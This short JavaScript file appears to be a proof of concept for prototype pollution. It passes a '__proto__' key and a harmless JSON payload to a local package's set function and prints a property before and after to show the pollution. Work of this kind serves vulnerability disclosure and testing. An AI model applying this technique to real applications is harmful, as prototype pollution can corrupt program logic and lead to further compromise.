var malicious_payload = '{"oops":"It works !"}';

var a = {
	set: require('./package/index.js').set,
	get: require('./package/index.js').get
};
var b = {}
console.log("Before : " + a.oops);
a.set('__proto__', JSON.parse(malicious_payload));
// did not change directly a.oops.
console.log("After : " + a.oops);
